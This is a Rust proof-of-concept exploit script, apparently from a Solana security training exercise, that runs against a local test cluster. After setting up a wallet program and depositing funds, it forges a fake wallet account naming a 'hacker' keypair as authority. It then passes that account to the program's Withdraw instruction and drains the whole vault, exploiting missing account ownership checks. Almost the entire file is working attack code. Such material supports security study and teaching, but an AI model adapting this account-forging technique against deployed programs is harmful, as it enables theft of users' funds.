use owo_colors::OwoColorize;

use poc_framework::{
    Environment,
    localhost_client,
    keypair, RemoteEnvironment,
    solana_program::{
        pubkey::Pubkey,
        instruction::{AccountMeta, Instruction},
    },
    solana_sdk::{
        system_program,
        signature::{read_keypair_file, Signer},
        bpf_loader_upgradeable::UpgradeableLoaderState,
    },
};

use borsh::{BorshSerialize, BorshDeserialize};

// We use the same Structure created in the Smart Contract
#[derive(Debug, BorshDeserialize, BorshSerialize)]

pub enum WalletInstruction {
    Initialize,
    Deposit { amount: u64 },
    Withdraw { amount: u64 },
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Wallet {
    pub authority: Pubkey,
    pub vault: Pubkey,
}

pub const WALLET_LEN: u64 = 32 + 32;

pub fn main() {
    let programa_keypair = read_keypair_file("./target/so/level0-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();
    let cliente1 = localhost_client();
    
    let hacker = keypair(1);
    let authority_info = keypair(2);

    let (wallet_address, _ ) =
    Pubkey::find_program_address(&[&authority_info.pubkey().to_bytes()], &programa);
    let (vault_address, _ ) = Pubkey::find_program_address(
    &[&authority_info.pubkey().to_bytes(), &"VAULT".as_bytes()], &programa);

    /* First we create the accounts */
 
    let mut env = RemoteEnvironment::new_with_airdrop(cliente1, keypair(2), 10000000000);

            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false),
                        AccountMeta::new(vault_address, false),
                        AccountMeta::new(authority_info.pubkey(), true),
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Initialize.try_to_vec().unwrap(), 
                        }],
                        &[&authority_info],
                    );
            let wallet_address_info = env.get_account(wallet_address).unwrap();
            let vault_address_info = env.get_account(vault_address).unwrap();

            let wallet_address_deser = env.get_deserialized_account::<Wallet>(wallet_address).unwrap();
            println!("{}", "********************************************".bright_blue().bold());
            println!("{}", "*    INITIALIZING & CREATING ACCOUNTS      *".bright_blue().bold());
            println!("{}", "********************************************".bright_blue().bold());
            println!("");
            println!("{}", "INITIALIZE & CREATE ACCOUNTS".bold().yellow());
            println!("");
            println!("{}", "PDA Addresses created!".bold().red());
            println!("");
            println!("{} {} {} {:?}", "Wallet address: ".bold().yellow(), wallet_address.yellow(), 
            "  Wallet address info: ".bold().blue(), wallet_address_info.blue());
            println!("");
            println!("{} {} {} {:?}", "Vault address: ".bold().yellow(), vault_address.yellow(), 
            "  Vault address info: ".bold().blue(), vault_address_info.blue());
            println!("");
            println!("{} {:?}", 
            "Wallet address data deser with Wallet Struct: ".bold().green(), wallet_address_deser.green());
            println!("");
            println!("");
            println!("");
  
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false), //<- deser vault data must be = vault_addr
                        AccountMeta::new(vault_address, false), //<- must be = wallet_address.vault <--|
                        AccountMeta::new(authority_info.pubkey(), true), //<- source - dest ----------/
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Deposit { amount: 10000 }.try_to_vec().unwrap(),
                    }],
                        &[&authority_info],
                    );
            let wallet_address_info = env.get_account(wallet_address).unwrap();
            let vault_address_info = env.get_account(vault_address).unwrap();

            let wallet_address_deser = env.get_deserialized_account::<Wallet>(wallet_address).unwrap();

            println!("{}", "********************************************".bright_blue().bold());
            println!("{}", "*               TRANSFERING                *".bright_blue().bold());
            println!("{}", "********************************************".bright_blue().bold());
            println!("");
            println!("{} {} {} {}", "From: ".bold().red(), authority_info.pubkey().red(),
            " ---- > AMOUNT: 10000 ---- TO -->".bold().green(), vault_address.blue());
            println!("");
            println!("{} {} {} {:?}", "Wallet address: ".bold().yellow(), wallet_address.yellow(), 
            "  Wallet address info: ".bold().blue(), wallet_address_info.blue());
            println!("");
            println!("{} {} {} {:?}", "Vault address: ".bold().yellow(), vault_address.yellow(), 
            "  Vault address info: ".bold().blue(), vault_address_info.blue());
            println!("");
            println!("{} {:?}", 
            "Wallet address data deser with Wallet Struct: ".bold().green(), wallet_address_deser.green());
            println!("");
            println!("");
            println!("");


               /* Third we steal the money */
               println!("");
               println!("{}", "********************************************".bright_blue().bold());
               println!("{}", "*        WITHDRAWING FUNDS TO HACKER       *".bright_blue().bold());
               println!("{}", "********************************************".bright_blue().bold());
               println!("");

            let hacker_wallet = Wallet {
                authority: hacker.pubkey(),
                vault: vault_address,
            };

            let mut hacker_wallet_data: Vec<u8> = vec![];
            hacker_wallet.serialize(&mut hacker_wallet_data).unwrap();

            let fake_wallet = keypair(3);
            env.create_account_with_data(&fake_wallet, hacker_wallet_data);

            let steal_amount = env.get_account(vault_address).unwrap().lamports;

            env.airdrop(hacker.pubkey(), 1000000);

            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(fake_wallet.pubkey(), false),
                        AccountMeta::new(vault_address, false), //<- source
                        AccountMeta::new(hacker.pubkey(), true),
                        AccountMeta::new(hacker.pubkey(), false), //<- destination
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Withdraw { amount: steal_amount }.try_to_vec().unwrap(),
                    }],
                        &[&hacker],
                    );
            let hacker_address_info = env.get_account(hacker.pubkey()).unwrap();
            let vault_address_info = env.get_account(vault_address);

            println!("{} {:?}", "Hacker info address: ".bold().blue(), hacker_address_info.blue());
            println!("");
            println!("{} {:?}", "Vault info address does not exist anymore, because 
            it doesn't have enough funds for the rent: ".bold().red(), 
            vault_address_info.blue().bright_purple().bold().underline());
            println!("");
            println!("");

            let account = env.get_account(programa).expect("couldn't retrieve account");
            let upgradable: UpgradeableLoaderState = account.deserialize_data().unwrap();
            if let UpgradeableLoaderState::Program {
                programdata_address,
            } = upgradable {println!("{} {:?} {} {:?} {} {:?}", "The PROGRAM EXECUTABLE DATA Account for: "
            .bold().green(), programa.red(), " has this Address: ".bold().green(), programdata_address.red(),
            ", and its account info is the following: ".bold().green(), 
            env.get_account(programdata_address).unwrap().blue());}
            println!("");

}